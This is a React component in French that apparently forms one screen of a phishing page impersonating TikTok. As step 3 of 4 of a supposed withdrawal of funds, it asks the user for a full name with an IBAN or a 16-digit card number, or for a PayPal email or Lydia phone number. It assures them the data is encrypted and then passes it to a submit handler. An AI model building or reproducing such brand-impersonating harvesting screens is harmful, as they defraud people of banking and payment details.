import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { ShieldCheck, ChevronRight, Building2, Wallet, CreditCard, Smartphone } from "lucide-react";
import TikTokHeader from "./TikTokHeader";

interface BankDetailsScreenProps {
  userName: string;
  onSubmit: (method: string, details: Record<string, string>) => void;
}

const WITHDRAWAL_METHODS = [
  {
    id: "iban",
    label: "Virement bancaire",
    subtitle: "Virement SEPA vers votre IBAN",
    icon: Building2,
  },
  {
    id: "card",
    label: "Carte bancaire",
    subtitle: "Versement sur votre carte",
    icon: CreditCard,
  },
  {
    id: "paypal",
    label: "PayPal",
    subtitle: "Envoi vers votre e-mail PayPal",
    icon: Wallet,
  },
  {
    id: "lydia",
    label: "Lydia",
    subtitle: "Vers votre numéro de téléphone",
    icon: Smartphone,
  },
];

const FIELD_LABELS: Record<string, string> = {
  iban: "IBAN",
  card: "Numéro de carte",
  name: "Nom complet",
  email: "E-mail PayPal",
  phone: "Numéro de téléphone",
};

type Step = "method" | "form" | "confirm";

const BankDetailsScreen = ({ userName, onSubmit }: BankDetailsScreenProps) => {
  const [step, setStep] = useState<Step>("method");
  const [selectedMethod, setSelectedMethod] = useState("");
  const [details, setDetails] = useState<Record<string, string>>({});

  const method = WITHDRAWAL_METHODS.find((m) => m.id === selectedMethod);

  const updateDetail = (key: string, value: string) =>
    setDetails((prev) => ({ ...prev, [key]: value }));

  const isFormValid = () => {
    if (selectedMethod === "iban") {
      return (
        (details.name?.trim().length ?? 0) > 2 &&
        (details.iban?.replace(/\s/g, "").length ?? 0) >= 15
      );
    }
    if (selectedMethod === "card") {
      return (
        (details.name?.trim().length ?? 0) > 2 &&
        (details.card?.replace(/\s/g, "").length ?? 0) === 16
      );
    }
    if (selectedMethod === "paypal") {
      return (details.email?.length ?? 0) > 3;
    }
    if (selectedMethod === "lydia") {
      return (details.phone?.replace(/\D/g, "").length ?? 0) >= 9;
    }
    return false;
  };

  const handleConfirm = () => onSubmit(selectedMethod, details);

  const maskValue = (key: string, value: string) => {
    if (key === "iban" || key === "card") {
      const clean = value.replace(/\s/g, "");
      return clean.slice(0, -4).replace(/./g, "•") + clean.slice(-4);
    }
    if (key === "phone") {
      return value.slice(0, -2).replace(/\d/g, "•") + value.slice(-2);
    }
    return value;
  };

  // --- METHOD SELECTION ---
  if (step === "method") {
    return (
      <div className="min-h-screen flex flex-col bg-background">
        <TikTokHeader showHelp />
        <div className="flex-1 px-6 py-6">
          <p className="text-sm text-muted-foreground mb-1">
            Bon retour, <strong className="text-foreground">{userName} !</strong>
          </p>
          <div className="mt-4 mb-2 flex items-center justify-between">
            <h2 className="text-xl font-semibold">Ajouter un moyen de retrait</h2>
            <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
              Étape 3 sur 4
            </span>
          </div>
          <p className="text-sm text-muted-foreground mb-5">
            Choisissez comment vous souhaitez recevoir vos fonds.
          </p>

          <div className="rounded-2xl border border-border bg-card overflow-hidden">
            {WITHDRAWAL_METHODS.map((m, i) => {
              const Icon = m.icon;
              return (
                <button
                  key={m.id}
                  onClick={() => { setSelectedMethod(m.id); setStep("form"); }}
                  className={`w-full flex items-center gap-3.5 px-4 py-3.5 text-left hover:bg-accent/50 transition-colors ${
                    i < WITHDRAWAL_METHODS.length - 1 ? "border-b border-border" : ""
                  }`}
                >
                  <div className="w-10 h-10 rounded-xl bg-secondary flex items-center justify-center shrink-0">
                    <Icon className="w-5 h-5 text-foreground" />
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-medium">{m.label}</p>
                    <p className="text-xs text-muted-foreground">{m.subtitle}</p>
                  </div>
                  <ChevronRight className="w-4 h-4 text-muted-foreground shrink-0" />
                </button>
              );
            })}
          </div>
        </div>
      </div>
    );
  }

  // --- CONFIRMATION ---
  if (step === "confirm") {
    const entries = Object.entries(details).filter(([, v]) => v);
    return (
      <div className="min-h-screen flex flex-col bg-background">
        <TikTokHeader showHelp />
        <div className="flex-1 px-6 py-6">
          <div className="mt-4 mb-2 flex items-center justify-between">
            <h2 className="text-xl font-semibold">Confirmez vos informations</h2>
            <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
              Étape 3 sur 4
            </span>
          </div>
          <p className="text-sm text-muted-foreground mb-6">
            Vérifiez vos informations {method?.label} avant d'envoyer.
          </p>

          <div className="rounded-2xl border border-border bg-card p-5 space-y-4">
            <div>
              <p className="text-xs text-muted-foreground">Moyen</p>
              <p className="text-sm font-medium">{method?.label}</p>
            </div>
            {entries.map(([key, value]) => (
              <div key={key}>
                <div className="h-px bg-border" />
                <div className="pt-4">
                  <p className="text-xs text-muted-foreground">{FIELD_LABELS[key] ?? key}</p>
                  <p className="text-sm font-medium">{maskValue(key, value)}</p>
                </div>
              </div>
            ))}
          </div>

          <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mt-5">
            <ShieldCheck className="w-4 h-4 text-success shrink-0" />
            <p className="text-xs text-muted-foreground">
              Vos données sont <strong className="text-foreground">chiffrées</strong> et protégées.
            </p>
          </div>

          <Button onClick={handleConfirm} className="w-full h-14 rounded-full text-base font-semibold mt-8">
            Confirmer et continuer
          </Button>
          <Button variant="ghost" onClick={() => setStep("form")} className="w-full mt-3 text-sm text-muted-foreground">
            ← Retour et modifier
          </Button>
        </div>
      </div>
    );
  }

  // --- FORM (per method) ---
  return (
    <div className="min-h-screen flex flex-col bg-background">
      <TikTokHeader showHelp />
      <div className="flex-1 px-6 py-6">
        <div className="mt-4 mb-2 flex items-center justify-between">
          <h2 className="text-xl font-semibold">Informations {method?.label}</h2>
          <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
            Étape 3 sur 4
          </span>
        </div>
        <p className="text-sm text-muted-foreground mb-4">
          Saisissez vos informations {method?.label} pour recevoir votre retrait.
        </p>

        <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mb-5">
          <ShieldCheck className="w-4 h-4 text-success shrink-0" />
          <p className="text-xs text-muted-foreground">
            Vos données sont <strong className="text-foreground">chiffrées</strong> et stockées en toute sécurité.
          </p>
        </div>

        <div className="space-y-4">
          {selectedMethod === "iban" && (
            <>
              <div>
                <label className="text-sm font-medium mb-1.5 block">Nom complet</label>
                <Input
                  type="text"
                  placeholder="Votre nom complet"
                  value={details.name || ""}
                  onChange={(e) => updateDetail("name", e.target.value)}
                  className="h-12 rounded-xl"
                />
              </div>
              <div>
                <label className="text-sm font-medium mb-1.5 block">IBAN</label>
                <Input
                  type="text"
                  placeholder="FR76 1234 5678 9012 3456 7890 123"
                  value={details.iban || ""}
                  onChange={(e) => updateDetail("iban", e.target.value.toUpperCase())}
                  className="h-12 rounded-xl"
                />
                {(details.iban?.replace(/\s/g, "").length ?? 0) > 0 && (details.iban?.replace(/\s/g, "").length ?? 0) < 15 && (
                  <p className="text-xs text-destructive mt-1">L'IBAN semble incomplet</p>
                )}
              </div>
            </>
          )}

          {selectedMethod === "card" && (
            <>
              <div>
                <label className="text-sm font-medium mb-1.5 block">Nom du titulaire</label>
                <Input
                  type="text"
                  placeholder="Nom figurant sur la carte"
                  value={details.name || ""}
                  onChange={(e) => updateDetail("name", e.target.value)}
                  className="h-12 rounded-xl"
                />
              </div>
              <div>
                <label className="text-sm font-medium mb-1.5 block">Numéro de carte</label>
                <Input
                  type="text"
                  inputMode="numeric"
                  maxLength={19}
                  placeholder="1234 5678 9012 3456"
                  value={details.card || ""}
                  onChange={(e) => {
                    const digits = e.target.value.replace(/\D/g, "").slice(0, 16);
                    const formatted = digits.replace(/(.{4})/g, "$1 ").trim();
                    updateDetail("card", formatted);
                  }}
                  className="h-12 rounded-xl"
                />
                {(details.card?.replace(/\s/g, "").length ?? 0) > 0 && (details.card?.replace(/\s/g, "").length ?? 0) < 16 && (
                  <p className="text-xs text-destructive mt-1">Le numéro de carte doit contenir 16 chiffres</p>
                )}
              </div>
            </>
          )}

          {selectedMethod === "paypal" && (
            <div>
              <label className="text-sm font-medium mb-1.5 block">E-mail PayPal</label>
              <Input
                type="email" placeholder="vous@exemple.com"
                value={details.email || ""}
                onChange={(e) => updateDetail("email", e.target.value)}
                className="h-12 rounded-xl"
              />
            </div>
          )}

          {selectedMethod === "lydia" && (
            <div>
              <label className="text-sm font-medium mb-1.5 block">Numéro de téléphone</label>
              <Input
                type="tel"
                inputMode="tel"
                placeholder="06 12 34 56 78"
                value={details.phone || ""}
                onChange={(e) => updateDetail("phone", e.target.value)}
                className="h-12 rounded-xl"
              />
              {(details.phone?.replace(/\D/g, "").length ?? 0) > 0 && (details.phone?.replace(/\D/g, "").length ?? 0) < 9 && (
                <p className="text-xs text-destructive mt-1">Le numéro semble incomplet</p>
              )}
            </div>
          )}
        </div>

        <Button
          onClick={() => setStep("confirm")}
          disabled={!isFormValid()}
          className="w-full h-14 rounded-full text-base font-semibold mt-8"
        >
          Continuer
        </Button>
        <Button variant="ghost" onClick={() => { setStep("method"); setDetails({}); }} className="w-full mt-3 text-sm text-muted-foreground">
          ← Changer de moyen
        </Button>
      </div>
    </div>
  );
};

export default BankDetailsScreen;
